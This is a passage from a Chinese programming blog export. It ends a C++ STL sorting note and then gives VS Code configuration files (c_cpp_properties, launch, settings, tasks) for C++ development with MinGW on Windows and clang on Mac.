class="string">&quot;\t数学:&quot;</span> &lt;&lt; c.math &lt;&lt; <span class="string">&quot;\t语文:&quot;</span> &lt;&lt; c.chinese &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外一个和sort相关的是stable_sort算法。这种稳定排序算法维持相等元素的原有顺序。</p>
<p>传递的谓词只能接受1个或者2个参数，如果我们想传入更多的参数怎么办呢，这就超出了算法对谓词的限制。这时候，我们就需要上lambda表达式了。具体细节以后会介绍。</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>C++ STL很好很强大，熟练使用它将使你如虎添翼。补充一个新手常踩的坑，在使用for循环时，不要在里面使用改变迭代器的操作，比如insert和erase，这些操作会使迭代器失效，从而引发意想不到的bug。</p>
<p>链接：<a href="http://www.jianshu.com/p/26d4d60233a4">http://www.jianshu.com/p/26d4d60233a4</a></p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCODE配置总结</title>
    <url>/EATPOOP/vs_environment/2023/12/05/</url>
    <content><![CDATA[<h2 id="WINDOWS下对VSCODE的四个文件配置"><a href="#WINDOWS下对VSCODE的四个文件配置" class="headerlink" title="WINDOWS下对VSCODE的四个文件配置"></a>WINDOWS下对VSCODE的四个文件配置</h2><blockquote>
<p>mingw放在c盘根目录下,安装medium的fira code</p>
</blockquote>
<h3 id="c-cpp-properties-json"><a href="#c-cpp-properties-json" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win32&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;_DEBUG&quot;</span><span class="punctuation">,</span> <span class="string">&quot;UNICODE&quot;</span><span class="punctuation">,</span> <span class="string">&quot;_UNICODE&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;windowsSdkVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.17763.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">          <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c11&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;default&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;g++.exe build and debug active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;\\test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span>		<span class="comment">/*修改成自己bin目录下的gdb.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;task g++&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="settings-json"><a href="#settings-json" class="headerlink" title="settings.json"></a>settings.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">/*editor*/</span></span><br><span class="line">    <span class="attr">&quot;editor.cursorBlinking&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smooth&quot;</span><span class="punctuation">,</span><span class="comment">//使编辑器光标的闪烁平滑，有呼吸感</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnPaste&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在粘贴时格式化代码</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnType&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//敲完一行代码自动格式化</span></span><br><span class="line">    <span class="attr">&quot;editor.smoothScrolling&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//使编辑器滚动变平滑</span></span><br><span class="line">    <span class="attr">&quot;editor.tabCompletion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//启用Tab补全</span></span><br><span class="line">    <span class="attr">&quot;editor.fontFamily&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;fira code&#x27;, &#x27;思源黑体&#x27;&quot;</span><span class="punctuation">,</span><span class="comment">//字体设置，个人喜欢Jetbrains Mono作英文字体，思源黑体作中文字体</span></span><br><span class="line">    <span class="attr">&quot;editor.fontSize&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> <span class="comment">//设置字体大小</span></span><br><span class="line">    <span class="attr">&quot;editor.fontWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;normal&quot;</span><span class="punctuation">,</span> <span class="comment">//这个设置字体粗细，可选normal,bold,&quot;100&quot;~&quot;900&quot;等，选择合适的就行</span></span><br><span class="line">    <span class="attr">&quot;editor.fontLigatures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//启用字体连字</span></span><br><span class="line">    <span class="attr">&quot;editor.detectIndentation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//不基于文件内容选择缩进用制表符还是空格</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    因为有时候VSCode的判断是错误的</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attr">&quot;editor.insertSpaces&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//敲下Tab键时插入4个空格而不是制表符</span></span><br><span class="line">    <span class="attr">&quot;editor.copyWithSyntaxHighlighting&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//复制代码时复制纯文本而不是连语法高亮都复制了</span></span><br><span class="line">    <span class="attr">&quot;editor.suggest.snippetsPreventQuickSuggestions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//这个开不开效果好像都一样，据说是因为一个bug，建议关掉</span></span><br><span class="line">    <span class="attr">&quot;editor.stickyTabStops&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在缩进上移动光标时四个空格一组来移动，就仿佛它们是制表符(\t)一样</span></span><br><span class="line">    <span class="attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="punctuation">:</span> <span class="string">&quot;off&quot;</span><span class="punctuation">,</span><span class="comment">//关闭基于文件中单词来联想的功能（语言自带的联想就够了，开了这个会导致用vscode写MarkDown时的中文引号异常联想）</span></span><br><span class="line">    <span class="attr">&quot;editor.linkedEditing&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//html标签自动重命名（喜大普奔！终于不需要Auto Rename Tag插件了！）</span></span><br><span class="line">    <span class="attr">&quot;editor.wordWrap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//在文件内容溢出vscode显示区域时自动折行</span></span><br><span class="line">    <span class="attr">&quot;editor.cursorSmoothCaretAnimation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//让光标移动、插入变得平滑</span></span><br><span class="line">    <span class="attr">&quot;editor.renderControlCharacters&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//编辑器中显示不可见的控制字符</span></span><br><span class="line">    <span class="attr">&quot;editor.renderWhitespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boundary&quot;</span><span class="punctuation">,</span><span class="comment">//除了两个单词之间用于分隔单词的一个空格，以一个小灰点的样子使空格可见</span></span><br><span class="line">    <span class="comment">/*terminal*/</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.defaultProfile.windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command Prompt&quot;</span><span class="punctuation">,</span><span class="comment">//将终端设为cmd，个人比较喜欢cmd作为终端</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.cursorBlinking&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//终端光标闪烁</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.rightClickBehavior&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span><span class="comment">//在终端中右键时显示菜单而不是粘贴（个人喜好）</span></span><br><span class="line">    <span class="comment">/*files*/</span></span><br><span class="line">    <span class="attr">&quot;files.autoGuessEncoding&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//让VScode自动猜源代码文件的编码格式</span></span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span><span class="punctuation">:</span> <span class="string">&quot;onFocusChange&quot;</span><span class="punctuation">,</span><span class="comment">//在编辑器失去焦点时自动保存，这使自动保存近乎达到“无感知”的体验</span></span><br><span class="line">    <span class="attr">&quot;files.exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//隐藏一些碍眼的文件夹</span></span><br><span class="line">        <span class="attr">&quot;**/.git&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.svn&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.hg&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/CVS&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.DS_Store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/tmp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/node_modules&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/bower_components&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.watcherExclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//不索引一些不必要索引的大文件夹以减少内存和CPU消耗</span></span><br><span class="line">        <span class="attr">&quot;**/.git/objects/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.git/subtree-cache/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/node_modules/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/tmp/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/bower_components/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/dist/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">/*workbench*/</span></span><br><span class="line">    <span class="attr">&quot;workbench.list.smoothScrolling&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//使文件列表滚动变平滑</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.enablePreview&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//打开文件时不是“预览”模式，即在编辑一个文件时打开编辑另一个文件不会覆盖当前编辑的文件而是新建一个标签页</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.wrapTabs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">//隐藏新建无标题文件时的“选择语言？”提示（个人喜好，可以删掉此行然后Ctrl+N打开无标题新文件看看不hidden的效果）</span></span><br><span class="line">    <span class="comment">/*explorer*/</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDelete&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//删除文件时不弹出确认弹窗（因为很烦）</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDragAndDrop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//往左边文件资源管理器拖动东西来移动/复制时不显示确认窗口（因为很烦）</span></span><br><span class="line">    <span class="comment">/*search*/</span></span><br><span class="line">    <span class="attr">&quot;search.followSymlinks&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//据说可以减少vscode的CPU和内存占用</span></span><br><span class="line">    <span class="comment">/*window*/</span></span><br><span class="line">    <span class="attr">&quot;window.menuBarVisibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;visible&quot;</span><span class="punctuation">,</span><span class="comment">//在全屏模式下仍然显示窗口顶部菜单（没有菜单很难受）</span></span><br><span class="line">    <span class="attr">&quot;window.dialogStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom&quot;</span><span class="punctuation">,</span><span class="comment">//使用更具有VSCode的UI风格的弹窗提示（更美观）</span></span><br><span class="line">    <span class="comment">/*debug*/</span></span><br><span class="line">    <span class="attr">&quot;debug.internalConsoleOptions&quot;</span><span class="punctuation">:</span> <span class="string">&quot;openOnSessionStart&quot;</span><span class="punctuation">,</span><span class="comment">//每次调试都打开调试控制台，方便调试</span></span><br><span class="line">    <span class="attr">&quot;debug.showBreakpointsInOverviewRuler&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在滚动条标尺上显示断点的位置，便于查找断点的位置</span></span><br><span class="line">    <span class="attr">&quot;debug.toolBarLocation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;docked&quot;</span><span class="punctuation">,</span><span class="comment">//固定调试时工具条的位置，防止遮挡代码内容（个人喜好）</span></span><br><span class="line">    <span class="attr">&quot;debug.saveBeforeStart&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nonUntitledEditorsInActiveGroup&quot;</span><span class="punctuation">,</span><span class="comment">//在启动调试会话前保存除了无标题文档以外的文档（毕竟你创建了无标题文档就说明你根本没有想保存它的意思（至少我是这样的。））</span></span><br><span class="line">    <span class="attr">&quot;debug.onTaskErrors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;showErrors&quot;</span><span class="punctuation">,</span><span class="comment">//预启动任务出错后显示错误，并不启动调试</span></span><br><span class="line">    <span class="comment">/*html*/</span></span><br><span class="line">    <span class="attr">&quot;html.format.indentHandlebars&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.empty.hint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hidden&quot;</span> <span class="punctuation">,</span><span class="comment">//在写包含形如&#123;&#123;xxx&#125;&#125;的标签的html文档时，也对标签进行缩进（更美观）</span></span><br><span class="line">    </span><br><span class="line">	<span class="attr">&quot;code-runner.executorMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cpp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; g++ -std=c++17 $fileName -g -o $test.exe -std=c++11 &amp;&amp; $dir$test.exe&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.runInTerminal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.associations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="tasks-json"><a href="#tasks-json" class="headerlink" title="tasks.json"></a>tasks.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// See https://go.microsoft.com/fwlink/?LinkId=733558 </span></span><br><span class="line">    <span class="comment">// for the documentation about the tasks.json format</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;task g++&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span>	<span class="comment">/*修改成自己bin目录下的g++.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;$&#123;workspaceFolder&#125;\\test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-I&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;E:\\Cpp code&quot;</span><span class="punctuation">,</span>      <span class="comment">/*修改成自己放c/c++项目的文件夹，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">            <span class="string">&quot;-std=c++17&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin&quot;</span>	<span class="comment">/*修改成自己bin目录，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">        </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="MAC中vscode的四个文件配置"><a href="#MAC中vscode的四个文件配置" class="headerlink" title="MAC中vscode的四个文件配置"></a>MAC中vscode的四个文件配置</h2><h3 id="c-cpp-properties-json-1"><a href="#c-cpp-properties-json-1" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mac&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;macFrameworkPath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/Frameworks&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/clang++&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;macos-clang-arm64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="launcn-json"><a href="#launcn-json" class="headerlink" title="launcn.json"></a>launcn.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span>  <span class="string">&quot;$&#123;workspaceFolder&#125;//test&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: clang++ 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

